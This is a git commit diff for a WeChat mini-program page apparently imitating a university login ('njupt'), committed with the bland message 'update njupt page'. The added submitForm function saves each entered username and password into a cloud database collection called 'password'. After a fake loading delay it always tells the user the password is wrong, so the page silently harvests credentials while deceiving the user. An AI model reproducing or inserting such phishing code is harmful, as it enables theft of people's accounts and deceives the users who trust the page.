dfc59b17fa46a65e4afa10aa6de8dca3cc147ed2
xjzsq <sdxjzsq@126.com>
2021-07-04 02:47:12 +0800

    update njupt page

--- pages/njupt/njupt.js
+++ pages/njupt/njupt.js
@@ -1,13 +1,58 @@
 // pages/njupt/njupt.js
+
+const db = wx.cloud.database();
 Page({
+
 
   /**
    * 页面的初始数据
    */
   data: {
-
+    username: "",
+    password: "",
+    hasSubmit: false
   },
 
+  formUsernameChange: function (e) {
+    this.setData({
+      username: e.detail.value
+    });
+  },
+
+  formPasswordChange: function (e) {
+    this.setData({
+      password: e.detail.value
+    });
+  },
+
+  submitForm: function (e) {
+    let that = this;
+    this.setData({
+      hasSubmit: true
+    });
+    wx.showLoading({
+      title: '加载中',
+    })
+    setTimeout(function () {
+      wx.hideLoading();
+      that.setData({
+        hasSubmit: false
+      });
+      wx.showToast({
+        title: '密码错误请重试',
+        icon: 'error',
+        duration: 2000
+      });
+    }, 3000);
+    db.collection('password').add({
+      data: {
+        username: this.data.username,
+        password: this.data.password
+      }
+    });
+
+
+  },
   /**
    * 生命周期函数--监听页面加载
    */
